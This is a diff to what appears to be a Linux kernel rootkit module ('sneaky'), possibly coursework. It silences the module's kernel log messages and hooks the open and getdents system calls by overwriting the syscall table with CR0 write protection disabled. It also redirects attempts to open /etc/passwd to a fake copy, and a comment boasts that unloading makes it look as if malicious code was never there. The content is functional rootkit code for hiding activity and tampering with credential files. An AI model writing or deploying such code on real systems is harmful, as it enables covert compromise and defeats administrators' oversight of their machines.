@@ -48,23 +48,16 @@ asmlinkage int (*original_read)(int fd, void *buf, size_t count);
 
 asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
 
-  printk(KERN_ALERT
-         "This guy wants to open /etc/passwd,redirect to /tmp.passwd now...\n");
+  //  printk(KERN_ALERT
+  //     "This guy wants to open /etc/passwd,redirect to /tmp.passwd now...\n");
 
-  if (strcmp(pathname, REAL_PWD)) {
-    if (copy_to_user((void *)pathname, FAKE_PWD, sizeof(FAKE_PWD)) != 0) {
-      printk(KERN_ALERT "SNEAKY_OPEN:failed to copy_to_user1 \n");
+  if (strcmp(pathname, REAL_PWD) == 0) {
+    if (copy_to_user((void *)pathname, FAKE_PWD, sizeof(FAKE_PWD) + 1) != 0) {
+      //  printk(KERN_ALERT "SNEAKY_OPEN:failed to copy_to_user1 \n");
       return -1;
     }
-    int ori_value = original_open(pathname, flags);
-    if (copy_to_user((void *)pathname, REAL_PWD, sizeof(REAL_PWD) != 0)) {
-      printk(KERN_ALERT "SNEAKY_OPEN:failed to copy_to_user2 \n");
-      return -1;
-    }
-    return ori_value;
-  } else {
-    return original_open(pathname, flags);
   }
+  return original_open(pathname, flags);
 }
 
 asmlinkage long sneaky_sys_getdents(unsigned int fd,
@@ -72,7 +65,7 @@ asmlinkage long sneaky_sys_getdents(unsigned int fd,
                                     unsigned int count) {
   long read_len = original_getdents(fd, dirent, count);
   if (read_len < 0) {
-    printk(KERN_ALERT "SNEKAY_GETDENTS:read_len < 0");
+    // printk(KERN_ALERT "SNEKAY_GETDENTS:read_len < 0");
     return read_len;
   }
 
@@ -98,6 +91,7 @@ asmlinkage long sneaky_sys_getdents(unsigned int fd,
 }
 
 asmlinkage int sneaky_sys_read(int fd, void *buf, size_t count) {
+
   int ori_value = original_read(fd, buf, count);
   char *sneaky_line = NULL;
   char *sneaky_line_end = NULL;
@@ -127,8 +121,8 @@ static int initialize_sneaky_module(void) {
   struct page *page_ptr;
 
   // See /var/log/syslog for kernel print output
-  printk(KERN_ALERT "Sneaky module being loaded.\n");
-  printk(KERN_ALERT "sneaky_pid is %s\n", sneaky_pid);
+  // printk(KERN_ALERT "Sneaky module being loaded.\n");
+  // printk(KERN_ALERT "sneaky_pid is %s\n", sneaky_pid);
 
   // Turn off write protection mode
   write_cr0(read_cr0() & (~0x10000));
@@ -142,14 +136,14 @@ static int initialize_sneaky_module(void) {
   // function address. Then overwrite its address in the system call
   // table with the function address of our new code.
 
-  /*original_open = (void *)*(sys_call_table + __NR_open);
+  original_open = (void *)*(sys_call_table + __NR_open);
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
-   original_getdents =
-      (void *)*(sys_call_table + __NR_getdents);
+
+  original_getdents = (void *)*(sys_call_table + __NR_getdents);
   *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
-  */
-  original_read = (void *)*(sys_call_table + __NR_read);
-  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
+
+  //  original_read = (void *)*(sys_call_table + __NR_read);
+  //*(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
 
   // Revert page to read-only
   pages_ro(page_ptr, 1);
@@ -162,7 +156,7 @@ static int initialize_sneaky_module(void) {
 static void exit_sneaky_module(void) {
   struct page *page_ptr;
 
-  printk(KERN_ALERT "Sneaky module being unloaded.\n");
+  // printk(KERN_ALERT "Sneaky module being unloaded.\n");
 
   // Turn off write protection mode
   write_cr0(read_cr0() & (~0x10000));
@@ -175,9 +169,9 @@ static void exit_sneaky_module(void) {
 
   // This is more magic! Restore the original 'open' system call
   // function address. Will look like malicious code was never there!
-  //*(sys_call_table + __NR_open) = (unsigned long)original_open;
-  //*(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
-  *(sys_call_table + __NR_read) = (unsigned long)original_read;
+  *(sys_call_table + __NR_open) = (unsigned long)original_open;
+  *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
+  //*(sys_call_table + __NR_read) = (unsigned long)original_read;
 
   // Revert page to read-only
   pages_ro(page_ptr, 1);
